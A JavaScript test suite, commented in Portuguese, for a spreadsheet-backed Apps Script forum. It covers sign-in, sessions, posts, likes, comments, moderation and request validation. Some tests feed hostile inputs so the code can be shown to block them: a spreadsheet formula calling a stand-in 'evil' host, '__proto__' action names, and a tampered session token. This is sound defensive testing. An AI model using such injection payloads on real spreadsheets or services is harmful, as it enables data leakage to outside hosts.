'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const { createEnvironment } = require('./apps-script-fake');

const CLIENT_ID = 'test-client.apps.googleusercontent.com';
const START = Date.UTC(2026, 9, 19, 12, 0, 0);
const MINUTE = 60 * 1000;

function base64Url(value) {
  return Buffer.from(JSON.stringify(value)).toString('base64')
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

function idToken(env, subject, overrides) {
  const claims = Object.assign({
    aud: CLIENT_ID,
    iss: 'https://accounts.google.com',
    sub: subject,
    exp: Math.floor(START / 1000) + 3600
  }, overrides || {});
  const token = base64Url({ alg: 'RS256' }) + '.' + base64Url(claims) + '.c2lnbmF0dXJl';
  env.tokens.set(token, Object.assign({}, claims, { exp: String(claims.exp) }));
  return token;
}

function installedForum() {
  const env = createEnvironment();
  env.properties.set('GOOGLE_WEB_CLIENT_ID', CLIENT_ID);
  env.context.setup();
  let clock = START;
  const call = (request, at) => {
    const now = at === undefined ? (clock += 1000) : at;
    // Passa por JSON como na resposta HTTP real (e tira os objetos do contexto vm).
    return JSON.parse(JSON.stringify(
      env.context.respond(() => env.context.handleRequest(Object.assign({ v: 1 }, request), now))
    ));
  };
  const ok = (request, at) => {
    const response = call(request, at);
    assert.equal(response.ok, true, 'falhou: ' + JSON.stringify(response));
    return response.data;
  };
  const signIn = (subject, displayName, avatarId) => ok({
    action: 'signIn',
    idToken: idToken(env, subject),
    author: { displayName: displayName, avatarId: avatarId || 0 }
  }, START);
  const sheet = name => env.spreadsheets.get(env.properties.get('SPREADSHEET_ID')).getSheetByName(name);
  const advance = millis => { clock += millis; };
  return { env, call, ok, signIn, sheet, advance };
}

function author(name, avatarId) {
  return { displayName: name, avatarId: avatarId || 0 };
}

test('setup cria as abas, os segredos e pode rodar de novo sem apagar nada', () => {
  const env = createEnvironment();
  env.context.setup();
  const book = env.spreadsheets.get(env.properties.get('SPREADSHEET_ID'));
  assert.deepEqual(
    book.getSheets().map(sheet => sheet.getName()).sort(),
    ['comments', 'likes', 'notifications', 'posts', 'reports', 'users']
  );
  assert.equal(book.getSheetByName('posts').getRange(1, 1, 1, 3).getValues()[0].join(','),
    'id,authorId,authorName');
  const salt = env.properties.get('USER_ID_SALT');
  assert.match(salt, /^[0-9a-f]{64}$/);

  env.context.setup();
  assert.equal(env.properties.get('USER_ID_SALT'), salt);
  assert.equal(env.spreadsheets.size, 1);
  assert.ok(env.logs.some(([level]) => level === 'warn'), 'avisa que falta o client ID');
});

test('doGet só diz configurado depois do client ID', () => {
  const env = createEnvironment();
  env.context.setup();
  const before = JSON.parse(env.context.doGet().getContent());
  assert.equal(before.data.configured, false);
  env.properties.set('GOOGLE_WEB_CLIENT_ID', CLIENT_ID);
  const after = JSON.parse(env.context.doGet().getContent());
  assert.deepEqual(after, { ok: true, data: { service: 'hardblock-forum', version: 1, configured: true } });
});

test('entrar com Google gera o mesmo ID sem expor o sub e guarda só nome e avatar', () => {
  const forum = installedForum();
  const first = forum.signIn('google-sub-123', '  Ana   Clara ', 2);
  const again = forum.signIn('google-sub-123', 'Ana', 4);
  const other = forum.signIn('google-sub-456', 'Bia', 1);

  assert.match(first.userId, /^u[0-9a-f]{24}$/);
  assert.equal(again.userId, first.userId);
  assert.notEqual(other.userId, first.userId);
  assert.ok(!first.userId.includes('123'));
  assert.equal(first.expiresAt, START + 90 * 24 * 60 * MINUTE);

  const users = forum.sheet('users');
  assert.equal(users.getLastRow(), 3);
  const row = users.getRange(2, 1, 1, 6).getValues()[0];
  assert.deepEqual(row.slice(0, 3), [first.userId, '"Ana"', 4]);
  assert.ok(!JSON.stringify(users.rows).includes('google-sub'));
});

test('token com audiência errada é recusado sem gastar UrlFetch', () => {
  const forum = installedForum();
  const response = forum.call({
    action: 'signIn',
    idToken: idToken(forum.env, 'sub-1', { aud: 'outro-app.apps.googleusercontent.com' }),
    author: author('Ana')
  }, START);
  assert.deepEqual(response, { ok: false, error: 'invalid_token' });
  assert.equal(forum.env.state.urlFetches, 0);
});

test('token que o Google não confirma é recusado', () => {
  const forum = installedForum();
  const token = idToken(forum.env, 'sub-1');
  forum.env.tokens.delete(token);
  assert.deepEqual(
    forum.call({ action: 'signIn', idToken: token, author: author('Ana') }, START),
    { ok: false, error: 'invalid_token' }
  );
  assert.equal(forum.env.state.urlFetches, 1);
});

test('sessão adulterada, de outro segredo ou vencida não passa', () => {
  const forum = installedForum();
  const { session, expiresAt } = forum.signIn('sub-1', 'Ana');
  const parts = session.split('.');
  const tampered = [parts[0], 'u' + '0'.repeat(24), parts[2], parts[3]].join('.');

  assert.equal(forum.call({ action: 'listPosts', session }).ok, true);
  assert.deepEqual(forum.call({ action: 'listPosts', session: tampered }), { ok: false, error: 'unauthorized' });
  assert.deepEqual(forum.call({ action: 'listPosts', session: 'lixo' }), { ok: false, error: 'unauthorized' });
  assert.deepEqual(forum.call({ action: 'listPosts', session }, expiresAt), { ok: false, error: 'unauthorized' });

  forum.env.context.rotateSessionSecret();
  assert.deepEqual(forum.call({ action: 'listPosts', session }), { ok: false, error: 'unauthorized' });
});

test('texto vira string JSON na planilha e volta idêntico, sem virar fórmula ou número', () => {
  const forum = installedForum();
  const ana = forum.signIn('sub-ana', 'Ana');
  const bodies = [
    '=IMPORTXML("http://evil", "//a")',
    '+5511999999999',
    '12345',
    'linha 1\n\n  linha 2 com "aspas" e \\barra',
    '😀 emoji'
  ];
  bodies.forEach(body => forum.ok({ action: 'publishPost', session: ana.session, body, author: author('=Ana') }));

  const { posts } = forum.ok({ action: 'listPosts', session: ana.session });
  assert.deepEqual(posts.map(post => post.body), bodies.slice().reverse());
  assert.equal(posts[0].authorName, '=Ana');
  assert.equal(forum.sheet('posts').getRange(2, 5).getValue(), JSON.stringify(bodies[0]));
});

test('publicação normaliza texto, corta no limite e recusa vazio', () => {
  const forum = installedForum();
  const ana = forum.signIn('sub-ana', 'Ana');
  const long = '😀'.repeat(1200);
  const { post } = forum.ok({
    action: 'publishPost',
    session: ana.session,
    body: long,
    author: author('Ana', 9)
  });
  assert.equal(Array.from(post.body).length, 1000);
  const trimmed = forum.ok({ action: 'publishPost', session: ana.session, body: '\r\n  oi\r\n', author: author('Ana') });
  assert.equal(trimmed.post.body, 'oi');
  assert.equal(post.avatarId, 0);
  assert.equal(post.authorId, ana.userId);

  assert.deepEqual(
    forum.call({ action: 'publishPost', session: ana.session, body: ' \n\t ', author: author('Ana') }),
    { ok: false, error: 'bad_request' }
  );
});

test('o feed pagina sem repetir nem pular, mesmo com posts escondidos', () => {
  const forum = installedForum();
  const ana = forum.signIn('sub-ana', 'Ana');
  for (let index = 1; index <= 45; index++) {
    forum.advance(10 * MINUTE);
    forum.ok({ action: 'publishPost', session: ana.session, body: 'post ' + index, author: author('Ana') });
  }
  // A dona esconde o post 30 direto na planilha.
  forum.sheet('posts').getRange(31, 9).setValue('hidden');

  const seen = [];
  let cursor = null;
  let pages = 0;
  do {
    const page = forum.ok({ action: 'listPosts', session: ana.session, cursor });
    seen.push(...page.posts.map(post => post.body));
    cursor = page.nextCursor;
    pages++;
  } while (cursor && pages < 10);

  const expected = [];
  for (let index = 45; index >= 1; index--) if (index !== 30) expected.push('post ' + index);
  assert.deepEqual(seen, expected);
  assert.equal(pages, 3);
});

test('dois posts no mesmo milissegundo ganham horários crescentes', () => {
  const forum = installedForum();
  const ana = forum.signIn('sub-ana', 'Ana');
  const at = START + MINUTE;
  const first = forum.ok({ action: 'publishPost', session: ana.session, body: 'a', author: author('Ana') }, at);
  const second = forum.ok({ action: 'publishPost', session: ana.session, body: 'b', author: author('Ana') }, at);
  assert.equal(second.post.createdAt, first.post.createdAt + 1);
});

test('curtida é única por pessoa, notifica o autor e some ao descurtir', () => {
  const forum = installedForum();
  const ana = forum.signIn('sub-ana', 'Ana');
  const bia = forum.signIn('sub-bia', 'Bia', 3);
  const caio = forum.signIn('sub-caio', 'Caio');
  const { post } = forum.ok({ action: 'publishPost', session: ana.session, body: 'oi', author: author('Ana') });

  const liked = forum.ok({ action: 'toggleLike', session: bia.session, postId: post.id, author: author('Bia', 3) });
  assert.equal(liked.post.likeCount, 1);
  assert.equal(liked.post.likedByMe, true);
  forum.ok({ action: 'toggleLike', session: caio.session, postId: post.id, author: author('Caio') });

  const asAna = forum.ok({ action: 'listPosts', session: ana.session }).posts[0];
  const asBia = forum.ok({ action: 'listPosts', session: bia.session }).posts[0];
  assert.equal(asAna.likeCount, 2);
  assert.equal(asAna.likedByMe, false);
  assert.equal(asBia.likedByMe, true);

  let notifications = forum.ok({ action: 'listNotifications', session: ana.session }).notifications;
  assert.deepEqual(notifications.map(item => [item.actorName, item.type, item.read]),
    [['Caio', 'LIKE', false], ['Bia', 'LIKE', false]]);
  assert.equal(notifications[1].actorAvatarId, 3);

  const unliked = forum.ok({ action: 'toggleLike', session: bia.session, postId: post.id, author: author('Bia') });
  assert.equal(unliked.post.likeCount, 1);
  assert.equal(unliked.post.likedByMe, false);
  notifications = forum.ok({ action: 'listNotifications', session: ana.session }).notifications;
  assert.deepEqual(notifications.map(item => item.actorName), ['Caio']);

  const relike = forum.ok({ action: 'toggleLike', session: bia.session, postId: post.id, author: author('Bia') });
  assert.equal(relike.post.likeCount, 2);
});

test('curtir o próprio post não gera notificação', () => {
  const forum = installedForum();
  const ana = forum.signIn('sub-ana', 'Ana');
  const { post } = forum.ok({ action: 'publishPost', session: ana.session, body: 'oi', author: author('Ana') });
  forum.ok({ action: 'toggleLike', session: ana.session, postId: post.id, author: author('Ana') });
  assert.deepEqual(forum.ok({ action: 'listNotifications', session: ana.session }).notifications, []);
});

test('comentários ficam em ordem, contam certo e só o autor apaga', () => {
  const forum = installedForum();
  const ana = forum.signIn('sub-ana', 'Ana');
  const bia = forum.signIn('sub-bia', 'Bia');
  const { post } = forum.ok({ action: 'publishPost', session: ana.session, body: 'oi', author: author('Ana') });
  const other = forum.ok({ action: 'publishPost', session: ana.session, body: 'outro', author: author('Ana') }).post;

  const first = forum.ok({ action: 'addComment', session: bia.session, postId: post.id, body: 'primeiro', author: author('Bia') });
  forum.ok({ action: 'addComment', session: ana.session, postId: other.id, body: 'em outro post', author: author('Ana') });
  const second = forum.ok({ action: 'addComment', session: ana.session, postId: post.id, body: 'segundo', author: author('Ana') });
  assert.equal(first.commentsCount, 1);
  assert.equal(second.commentsCount, 2);

  const { comments } = forum.ok({ action: 'listComments', session: bia.session, postId: post.id });
  assert.deepEqual(comments.map(comment => comment.body), ['primeiro', 'segundo']);

  assert.deepEqual(
    forum.call({ action: 'deleteComment', session: ana.session, postId: post.id, commentId: first.comment.id }),
    { ok: false, error: 'forbidden' }
  );
  const removed = forum.ok({ action: 'deleteComment', session: bia.session, postId: post.id, commentId: first.comment.id });
  assert.equal(removed.commentsCount, 1);
  assert.deepEqual(
    forum.ok({ action: 'listComments', session: ana.session, postId: post.id }).comments.map(c => c.body),
    ['segundo']
  );
  assert.equal(forum.ok({ action: 'listPosts', session: ana.session }).posts[1].commentsCount, 1);

  const notifications = forum.ok({ action: 'listNotifications', session: ana.session }).notifications;
  assert.deepEqual(notifications.map(item => [item.actorName, item.type]), [['Bia', 'COMMENT']]);
});

test('post apagado pelo autor some do feed, dos meus posts e dos comentários', () => {
  const forum = installedForum();
  const ana = forum.signIn('sub-ana', 'Ana');
  const bia = forum.signIn('sub-bia', 'Bia');
  const { post } = forum.ok({ action: 'publishPost', session: ana.session, body: 'segredo', author: author('Ana') });
  forum.ok({ action: 'publishPost', session: ana.session, body: 'fica', author: author('Ana') });

  assert.deepEqual(forum.call({ action: 'deletePost', session: bia.session, postId: post.id }),
    { ok: false, error: 'forbidden' });
  forum.ok({ action: 'deletePost', session: ana.session, postId: post.id });

  assert.deepEqual(forum.ok({ action: 'listPosts', session: bia.session }).posts.map(p => p.body), ['fica']);
  assert.deepEqual(forum.ok({ action: 'listUserPosts', session: ana.session }).posts.map(p => p.body), ['fica']);
  assert.deepEqual(forum.call({ action: 'listComments', session: bia.session, postId: post.id }),
    { ok: false, error: 'not_found' });
  assert.deepEqual(forum.call({ action: 'toggleLike', session: bia.session, postId: post.id, author: author('Bia') }),
    { ok: false, error: 'not_found' });
  assert.ok(!JSON.stringify(forum.sheet('posts').rows).includes('segredo'));
});

test('três denúncias de pessoas diferentes escondem o post; repetir não conta', () => {
  const forum = installedForum();
  const ana = forum.signIn('sub-ana', 'Ana');
  const reporters = ['b', 'c', 'd'].map(name => forum.signIn('sub-' + name, name));
  const { post } = forum.ok({ action: 'publishPost', session: ana.session, body: 'spam', author: author('Ana') });

  assert.deepEqual(forum.call({ action: 'report', session: ana.session, targetType: 'post', targetId: post.id }),
    { ok: false, error: 'forbidden' });
  forum.ok({ action: 'report', session: reporters[0].session, targetType: 'post', targetId: post.id });
  forum.ok({ action: 'report', session: reporters[0].session, targetType: 'post', targetId: post.id });
  forum.ok({ action: 'report', session: reporters[1].session, targetType: 'post', targetId: post.id });
  assert.equal(forum.ok({ action: 'listPosts', session: ana.session }).posts.length, 1);

  forum.ok({ action: 'report', session: reporters[2].session, targetType: 'post', targetId: post.id });
  assert.equal(forum.ok({ action: 'listPosts', session: ana.session }).posts.length, 0);
  assert.equal(forum.sheet('reports').getLastRow(), 4);
});

test('comentário escondido por denúncias sai da contagem do post', () => {
  const forum = installedForum();
  const ana = forum.signIn('sub-ana', 'Ana');
  const bia = forum.signIn('sub-bia', 'Bia');
  const { post } = forum.ok({ action: 'publishPost', session: ana.session, body: 'oi', author: author('Ana') });
  const { comment } = forum.ok({ action: 'addComment', session: bia.session, postId: post.id, body: 'feio', author: author('Bia') });
  ['x', 'y', 'z'].forEach(name => {
    const reporter = forum.signIn('sub-' + name, name);
    forum.ok({ action: 'report', session: reporter.session, targetType: 'comment', targetId: comment.id });
  });
  assert.deepEqual(forum.ok({ action: 'listComments', session: ana.session, postId: post.id }).comments, []);
  assert.equal(forum.ok({ action: 'listPosts', session: ana.session }).posts[0].commentsCount, 0);
});

test('conta banida na planilha continua lendo, mas não escreve', () => {
  const forum = installedForum();
  const ana = forum.signIn('sub-ana', 'Ana');
  forum.sheet('users').getRange(2, 6).setValue('banned');
  forum.env.cache.clear();
  assert.equal(forum.call({ action: 'listPosts', session: ana.session }).ok, true);
  assert.deepEqual(
    forum.call({ action: 'publishPost', session: ana.session, body: 'oi', author: author('Ana') }),
    { ok: false, error: 'banned' }
  );
});

test('escrever rápido demais esbarra no limite por minuto', () => {
  const forum = installedForum();
  const ana = forum.signIn('sub-ana', 'Ana');
  const at = START + 5 * MINUTE;
  for (let index = 0; index < 12; index++) {
    forum.ok({ action: 'publishPost', session: ana.session, body: 'p' + index, author: author('Ana') }, at + index);
  }
  assert.deepEqual(
    forum.call({ action: 'publishPost', session: ana.session, body: 'demais', author: author('Ana') }, at + 20),
    { ok: false, error: 'rate_limited' }
  );
  assert.equal(
    forum.call({ action: 'publishPost', session: ana.session, body: 'depois', author: author('Ana') }, at + MINUTE).ok,
    true
  );
});

test('trava ocupada devolve busy sem gravar nada', () => {
  const forum = installedForum();
  const ana = forum.signIn('sub-ana', 'Ana');
  forum.env.state.lockAvailable = false;
  assert.deepEqual(
    forum.call({ action: 'publishPost', session: ana.session, body: 'oi', author: author('Ana') }),
    { ok: false, error: 'busy' }
  );
  assert.equal(forum.sheet('posts').getLastRow(), 1);
  assert.equal(forum.env.state.lockHeld, false);
});

test('marcar notificações como lidas', () => {
  const forum = installedForum();
  const ana = forum.signIn('sub-ana', 'Ana');
  const bia = forum.signIn('sub-bia', 'Bia');
  const { post } = forum.ok({ action: 'publishPost', session: ana.session, body: 'oi', author: author('Ana') });
  forum.ok({ action: 'addComment', session: bia.session, postId: post.id, body: 'legal', author: author('Bia') });
  const marked = forum.ok({ action: 'markNotificationsRead', session: ana.session }).notifications;
  assert.deepEqual(marked.map(item => item.read), [true]);
  assert.deepEqual(
    forum.ok({ action: 'listNotifications', session: ana.session }).notifications.map(item => item.read),
    [true]
  );
});

test('doPost recusa corpo inválido, versão desconhecida e ação inexistente', () => {
  const forum = installedForum();
  const post = contents => JSON.parse(forum.env.context.doPost({ postData: { contents } }).getContent());
  assert.deepEqual(post('{nao e json'), { ok: false, error: 'bad_request' });
  assert.deepEqual(post(JSON.stringify({ v: 2, action: 'listPosts' })), { ok: false, error: 'unsupported_version' });
  assert.deepEqual(post(JSON.stringify({ v: 1, action: '__proto__' })), { ok: false, error: 'bad_request' });
  assert.deepEqual(post(JSON.stringify({ v: 1, action: 'toString' })), { ok: false, error: 'bad_request' });
  assert.deepEqual(post(JSON.stringify({ v: 1, action: 'listPosts' })), { ok: false, error: 'unauthorized' });
  assert.deepEqual(post('x'.repeat(20000)), { ok: false, error: 'bad_request' });
  assert.deepEqual(forum.env.context.doPost({}).getContent(), JSON.stringify({ ok: false, error: 'bad_request' }));
});

test('erro inesperado vira server_error sem vazar detalhe', () => {
  const forum = installedForum();
  const ana = forum.signIn('sub-ana', 'Ana');
  forum.env.properties.set('SPREADSHEET_ID', 'sumiu');
  const fresh = createEnvironment();
  fresh.properties.set('GOOGLE_WEB_CLIENT_ID', CLIENT_ID);
  for (const [key, value] of forum.env.properties) fresh.properties.set(key, value);
  const response = JSON.parse(JSON.stringify(fresh.context.respond(() =>
    fresh.context.handleRequest({ v: 1, action: 'listPosts', session: ana.session }, START + 1000))));
  assert.deepEqual(response, { ok: false, error: 'server_error' });
  assert.ok(fresh.logs.some(([level]) => level === 'error'));
});
